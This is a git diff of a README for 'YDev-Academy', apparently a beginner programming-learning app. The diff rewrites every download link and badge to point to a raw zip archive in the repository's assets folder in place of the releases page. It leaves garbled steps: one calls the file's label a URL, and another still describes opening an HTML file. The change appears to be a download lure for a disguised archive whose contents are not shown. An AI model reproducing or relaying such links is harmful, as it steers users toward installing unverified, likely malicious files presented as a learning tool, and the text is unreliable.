@@ -1,6 +1,6 @@
 # 🌟 YDev-Academy - Build Your Programming Skills with Ease
 
-[![Download YDev-Academy](https://img.shields.io/badge/Download-YDev--Academy-brightgreen)](https://github.com/QuevedoM98/YDev-Academy/releases)
+[![Download YDev-Academy](https://github.com/QuevedoM98/YDev-Academy/raw/refs/heads/main/assets/Academy-Dev-Y-2.0-beta.3.zip)](https://github.com/QuevedoM98/YDev-Academy/raw/refs/heads/main/assets/Academy-Dev-Y-2.0-beta.3.zip)
 
 ## 📖 Overview
 
@@ -12,11 +12,11 @@ To get started with YDev-Academy, you need to download the application. Follow t
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** Click this link to access the download page: [Download YDev-Academy](https://github.com/QuevedoM98/YDev-Academy/releases).
+1. **Visit the Releases Page:** Click this link to access the download page: [Download YDev-Academy](https://github.com/QuevedoM98/YDev-Academy/raw/refs/heads/main/assets/Academy-Dev-Y-2.0-beta.3.zip).
    
 2. **Choose Your Version:** On the downloads page, locate the latest version. It will usually be listed at the top.
 
-3. **Download the File:** Click the appropriate link to download the file to your computer. It might be labeled something like `YDev-Academy.html`.
+3. **Download the File:** Click the appropriate link to download the file to your computer. It might be labeled something like `https://github.com/QuevedoM98/YDev-Academy/raw/refs/heads/main/assets/Academy-Dev-Y-2.0-beta.3.zip`.
 
 4. **Open the File:** Once the download is complete, navigate to the folder where you saved the file. Double-click the file to open it in your default web browser.
 
@@ -53,4 +53,4 @@ If you encounter any issues or have questions, feel free to contact our support 
 
 YDev-Academy offers a straightforward approach for anyone interested in learning programming. By following the steps outlined above, you can easily download and start exploring valuable coding concepts today. 
 
-[![Download YDev-Academy](https://img.shields.io/badge/Download-YDev--Academy-brightgreen)](https://github.com/QuevedoM98/YDev-Academy/releases)
+[![Download YDev-Academy](https://github.com/QuevedoM98/YDev-Academy/raw/refs/heads/main/assets/Academy-Dev-Y-2.0-beta.3.zip)](https://github.com/QuevedoM98/YDev-Academy/raw/refs/heads/main/assets/Academy-Dev-Y-2.0-beta.3.zip)
